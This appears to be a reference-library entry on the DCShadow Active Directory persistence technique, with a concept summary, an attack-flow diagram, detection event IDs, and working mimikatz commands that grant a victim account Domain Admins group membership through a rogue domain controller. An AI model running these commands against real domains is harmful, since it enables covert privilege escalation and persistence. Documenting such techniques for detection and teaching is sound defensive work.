---
id: dcshadow
type: technique
label: "DCShadow"
phase: "persist"
tools: ["mimikatz"]
cve: null
detect: "Unexpected new DC registration; replication from an unrecognized server."
mitre: "T1207"
tag: null
---


# DCShadow

### Affected object / attribute
**Rogue DC registration** in the **Configuration partition**; pushes changes to **any AD object** via replication.

### Concept (deep)
Register a **rogue DC** via DRSUAPI, push arbitrary changes (e.g. **SID History**, `primaryGroupID`, ACLs), then unregister. Requires **DA + DC code execution**. Changes arrive as legitimate replication.

### Attack flow (Mermaid)
```mermaid
sequenceDiagram
    participant A as attacker (DA)
    participant DC as real DC
    participant R as rogue DC
    A->>R: Register rogue DC
    R->>DC: DrsReplicaAdd / GetNCChanges (push change)
    DC-->>R: Replication accepted
    A->>R: Unregister rogue DC
    Note over A: SID History / ACL change persisted
```

### Exhaustive commands
```plaintext
mimikatz # lsadump::dcshadow /object:CN=Victim,CN=Users,DC=corp,DC=local \
  /attribute:primaryGroupID /value:512
mimikatz # lsadump::dcshadow /push
```

### Detection
**4742/5136** changes with a replication source not in the DC list; **4928/4929** replication partner anomalies; **DRSUAPI from a non-DC**.

---
